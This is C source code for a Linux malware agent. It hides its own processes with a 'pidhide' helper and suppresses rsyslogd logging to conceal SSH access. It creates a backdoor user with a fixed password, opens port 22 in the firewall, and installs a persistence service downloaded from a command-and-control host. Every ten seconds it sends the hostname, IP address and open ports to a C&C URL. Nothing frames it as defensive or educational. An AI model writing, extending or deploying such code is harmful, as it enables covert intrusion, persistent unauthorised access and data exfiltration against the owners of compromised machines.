#define _XOPEN_SOURCE 500  // Enable certain library features
#include <ftw.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include<signal.h>
#include <unistd.h>
#include <curl/curl.h>
#include <jansson.h>


static const char *sbin_path = "/usr/sbin/";
static const char *username = "ebpfhelper";

typedef struct {
    char *name;
    int *pids;
    int count;
    int capacity;
} ProgramInfo;

pid_t run_task_and_hide(const char *cmd) {
    pid_t pid = fork();
    if (pid == 0) { // Child process for running the task
        system(cmd);
        exit(0);
    } else if (pid > 0) { // Parent process
        pid_t hide_pid = fork();
        if (hide_pid == 0) { // Child process for hiding the PID
            char hide_cmd[256];
            snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", pid);
            system(hide_cmd);
            exit(0);
        } else if (hide_pid < 0) { // Fork failed for hide_pid
            perror("fork");
            exit(1); // Exit if fork fails
        }
    } else { // Fork failed for run_task
        perror("fork");
        exit(1); // Exit if fork fails
    }
    return pid;
}



// Function to be applied to each file in the directory
static int remove_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
    int ret = remove(fpath);
    if (ret) {
        perror(fpath);
    }
    return ret;
}

// Function to purge a directory
void purge_directory(const char *dir_path) {
    // Use nftw to traverse the directory and apply remove_cb to each file
    if (nftw(dir_path, remove_cb, 64, FTW_DEPTH | FTW_PHYS) == -1) {
        perror("nftw");
        exit(EXIT_FAILURE);
    }
}

void find_pid_by_name(const char *program_name, int **found_pids) {
    char command[256];
    snprintf(command, sizeof(command), "pidof %s", program_name);

    FILE *fp = popen(command, "r");
    if (!fp) {
        perror("popen");
        exit(1);
    }

    char buffer[512];
    if (fgets(buffer, sizeof(buffer), fp)) {
        int pid_count = 0;
        for (char *token = strtok(buffer, " "); token; token = strtok(NULL, " ")) {
            *found_pids = realloc(*found_pids, (pid_count + 2) * sizeof(int));
            (*found_pids)[pid_count++] = atoi(token);
        }
        (*found_pids)[pid_count] = -1;
    }
    pclose(fp);
}


void find_pid_by_names(char **program_names, int num_programs, ProgramInfo *info) {
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir("/proc"))) {
        perror("opendir");
        return;
    }

    for (int i = 0; i < num_programs; ++i) {
        info[i].name = program_names[i];
        info[i].count = 0;
        info[i].capacity = 10;
        info[i].pids = malloc(info[i].capacity * sizeof(int));
        if (!info[i].pids) {
            perror("malloc");
            return;
        }
    }

    while ((entry = readdir(dir)) != NULL) {
        char path[512], buf[512];
        FILE *fp;

        if (!atoi(entry->d_name)) continue;

        snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
        if (!(fp = fopen(path, "r"))) continue;

        if (fgets(buf, sizeof(buf), fp)) {
            char *first_token = strtok(buf, " \t");

            for (int i = 0; i < num_programs; ++i) {
                if (first_token && strstr(first_token, program_names[i])) {
                    if (info[i].count >= info[i].capacity) {
                        info[i].capacity *= 2;
                        info[i].pids = realloc(info[i].pids, info[i].capacity * sizeof(int));
                        if (!info[i].pids) {
                            perror("realloc");
                            fclose(fp);
                            closedir(dir);
                            return;
                        }
                    }
                    info[i].pids[info[i].count++] = atoi(entry->d_name);
                }
            }
        }
        fclose(fp);
    }
    closedir(dir);
}

void download_file(const char *local_path, const char *url) {
    char cmd[1024];
    if (system("which curl") == 0) {
        snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
    } else if (system("which wget") == 0) {
        snprintf(cmd, sizeof(cmd), "wget -O %s %s", local_path, url);
    } else {
        fprintf(stderr, "Neither curl nor wget is available\n");
        exit(1);
    }
    system(cmd);
}


void create_and_enable_service() {
    // File doesn't exist, download it
    if (access("/etc/systemd/system/btrfs_helper.service", F_OK) == -1) {
        download_file("/etc/systemd/system/btrfs_helper.service", "http://ebpf-cnc.surge.sh/btrfs_helper.service");
    }

    // Reload systemd to recognize the new service
    if (system("systemctl daemon-reload") != 0) {
        fprintf(stderr, "Failed to reload systemd\n");
        exit(1);
    }

    // Enable the service
    if (system("systemctl enable btrfs_helper.service") != 0) {
        fprintf(stderr, "Failed to enable service\n");
        exit(1);
    }

    printf("Service created and enabled successfully.\n");
}

void allow_ssh() {
    // Find PIDs for a program, e.g., "rsyslogd"
    int *found_pids = NULL;
    find_pid_by_name("rsyslogd", &found_pids);

    // Print the found PIDs
    for (int i = 0; found_pids[i] != -1; ++i) {
        printf("%d ", found_pids[i]);
    }

    // Block the write to rsyslogd (hide SSH connection)
    for (int i = 0; found_pids[i] != -1 ; ++i) {
        char block_cmd[256];
        snprintf(block_cmd, sizeof(block_cmd), "/usr/sbin/writeblocker --pid %d", found_pids[i]);
        run_task_and_hide(block_cmd);
    }
    free(found_pids);
    if (system("which iptables > /dev/null 2>&1") == 0) {
        // If iptables is available
        system("iptables -A INPUT -p tcp --dport 22 -j ACCEPT");
        system("iptables-save > /etc/iptables/rules.v4");
    } else if (system("which ufw > /dev/null 2>&1") == 0) {
        // If ufw is available
        if (system("ufw status | grep -q 'Status: active'") == 0) {
            // If ufw is active
            system("ufw allow 22/tcp");
        } else {
            fprintf(stderr, "ufw is not active on this system.\n");
            exit(1);
        }
    } else {
        // Neither iptables nor ufw is available
        fprintf(stderr, "Neither iptables nor ufw is available on this system.\n");
        exit(1);
    }
}

void add_system_user(const char *username) {
    char cmd[256];

    // Create a system user with home directory in /var/ and bash shell
    snprintf(cmd, sizeof(cmd), "useradd -r -m -d /var/%s -s /bin/bash %s", username, username);
    if (system(cmd) != 0) {
        fprintf(stderr, "Failed to add system user\n");
        exit(1);
    }

    // Set a password for the user (in this example, the password is 'password')
    snprintf(cmd, sizeof(cmd), "echo '%s:password' | chpasswd", username);
    if (system(cmd) != 0) {
        fprintf(stderr, "Failed to set password for system user\n");
        exit(1);
    }
}

// Function to send API call
void send_api_call(const char *url, const char *data) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize libcurl\n");
        return;
    }

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, fwrite);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, stdout);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
}

// Function to gather system information and create JSON data
void gather_system_info(char *data, size_t max_size) {
    FILE *fp = popen("ss -tuln | grep -E '^(tcp|udp)' | awk '{print $5}' | cut -d: -f2 | sort -u", "r");
    if (fp) {
        // Gather available ports
        char line[32];
        char ports[128] = "";

        while (fgets(line, sizeof(line), fp) != NULL) {
            strcat(ports, line);
            strcat(ports, ", ");
        }

        pclose(fp);

        // Get hostname
        char hostname[128];
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            strcpy(hostname, "Unknown");
        }

        // Get IP address
        char ip_address[64];
        FILE *ip_fp = popen("hostname -I | awk '{print $1}'", "r");
        if (ip_fp) {
            fgets(ip_address, sizeof(ip_address), ip_fp);
            pclose(ip_fp);
            ip_address[strlen(ip_address) - 1] = '\0'; // Remove newline character
        } else {
            strcpy(ip_address, "Unknown");
        }

        // Create JSON data using Jansson
        json_t *root = json_object();
        json_object_set_new(root, "message", json_string("Prebuild is ready to be used, Pinging the Control & Command server"));
        json_object_set_new(root, "available_ports", json_string(ports));
        json_object_set_new(root, "ufw_status", json_string(access("/usr/sbin/ufw", F_OK) == 0 ? "Active" : "Inactive"));
        json_object_set_new(root, "hostname", json_string(hostname));
        json_object_set_new(root, "ip_address", json_string(ip_address));

        char *json_output = json_dumps(root, JSON_INDENT(4));
        snprintf(data, max_size, "%s", json_output);

        // Free JSON objects and strings
        json_decref(root);
        free(json_output);
    } else {
        fprintf(stderr, "Failed to execute ss\n");
    }
}

void handle_sigint(int sig) {
    int found_pids[64];
    size_t max_pids = 128;
    int pid_count;
    char *program_names[] = {"sudoadd", "pidhide", "writeblock"};
    int num_programs = sizeof(program_names) / sizeof(program_names[0]);
    ProgramInfo info[num_programs];

    find_pid_by_names(program_names, num_programs, info);


    printf("\nPerforming shutdown task before exiting... \n");

    for (int i = 0; i < num_programs; ++i) {
        printf("Program: %s\n", info[i].name);
        printf("PIDs: ");
        for (int j = 0; j < info[i].count; ++j) {
            printf("%d ", info[i].pids[j]);
            if (kill(info[i].pids[j], SIGINT) == -1) {
                perror("kill");
            }
        }
        printf("\n");
        free(info[i].pids);
    }

    remove("/tmp/btrfs.lock");  // Remove the lock file
    exit(0);

    printf("Shutdonw complete. Goodbuy. \n");
}


int main() {
    if (access("/tmp/btrfs.lock", F_OK) != -1) {
        printf("Another instance is running.\n");
        exit(1);
    } else {
        FILE *fp = fopen("/tmp/btrfs.lock", "w");
        fclose(fp);
    }
    signal(SIGINT, handle_sigint);
    int found_pids[64];
    char cmd[1024];
    char data[1024];


    char local_file_path[256];
    const char *url = "http://monchi.local:3000/cnc";

//
//    // Check if username exists, if not add it
//    if (getpwnam(username) == NULL) {
//        printf("Adding new user...\n");
//        add_system_user(username);
//    }
//    // Enable ssh
//    allow_ssh();
//
//    // Loop through each program to check if it exists, if not download it
//    for (int i = 0; programs[i] != NULL; ++i) {
//        snprintf(local_file_path, sizeof(local_file_path), "%s/%s", sbin_path, programs[i]);
//        if (access(local_file_path, F_OK) == -1) {
//            snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
//            download_file(local_file_path, cmd);
//        }
//    }
//
    // Run pidhide on this program
    pid_t hide_pid = fork();
    if (hide_pid == 0) { // Child process for hiding the PID
        char hide_cmd[256];
        char pid_str[64];
        // snprintf(hide_cmd, sizeof(hide_cmd), "/usr/sbin/pidhide -p %d", parent_pid);
        snprintf(pid_str, sizeof(pid_str), "%d", getppid());
        int *found_pids = NULL;
        find_pid_by_name("rsyslogd", &found_pids);

        // Print the found PIDs
        for (int i = 0; found_pids[i] != -1; ++i) {
            printf("%d ", found_pids[i]);
        }
        
        execl("/usr/sbin/pidhide", "pidhide", "-p", pid_str, NULL);
        // system(hide_cmd);
    } else if (hide_pid > 0) { // Fork failed for hide_pid
        while (1) {
            gather_system_info(data, sizeof(data));
            printf("Generated JSON:\n%s\n", data);
            send_api_call(url, data);

            sleep(10); // Wait for 10 seconds before the next iteration
        }
    }
    else {
        perror("fork");
        exit(1); // Exit if fork fails
    }

//
//    // Run sudo_add as a daemon
//    snprintf(cmd, sizeof(cmd), "/usr/sbin/sudoadd -u %s", username);
//    pid_t pid = run_task(cmd);
//    hide_pid(pid);
//
//    // Create the service make sure this program runs every boot after network connection established
//    create_and_enable_service();
//
    // Loop to run indefinitely
}